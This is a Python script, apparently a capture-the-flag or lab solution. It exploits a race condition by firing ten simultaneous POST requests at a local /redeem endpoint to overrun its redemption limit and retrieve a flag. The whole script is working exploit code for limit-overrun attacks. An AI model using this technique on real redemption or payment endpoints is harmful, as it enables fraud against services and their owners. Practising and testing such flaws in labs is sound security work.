#!/usr/bin/env python3
"""
Race Condition Verification Test
Sends concurrent POST requests to /redeem to test limit overrun.
"""

import concurrent.futures

import requests

TARGET = "http://localhost:8097"


def reset():
    r = requests.post(f"{TARGET}/reset")
    print(f"[*] Reset: {r.json()}")


def redeem():
    try:
        r = requests.post(f"{TARGET}/redeem", timeout=5)
        return r.status_code, r.json()
    except Exception as e:
        return 500, str(e)


def main():
    print("[*] Testing race condition on", TARGET)
    reset()

    # Launch 10 concurrent threads simultaneously
    with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:
        futures = [executor.submit(redeem) for _ in range(10)]
        results = [f.result() for f in concurrent.futures.as_completed(futures)]

    print("[*] Responses:")
    flag_found = False
    for code, body in results:
        print(f"    Status {code}: {body}")
        if isinstance(body, dict) and "FLAG{" in body.get("message", ""):
            flag_found = True
            print(f"[+] SUCCESS: Retrieved Flag: {body['message']}")

    if flag_found:
        print("[+] Race condition verified successfully!")
        return 0
    else:
        print("[-] Race condition did not trigger.")
        return 1


if __name__ == "__main__":
    import sys

    sys.exit(main())
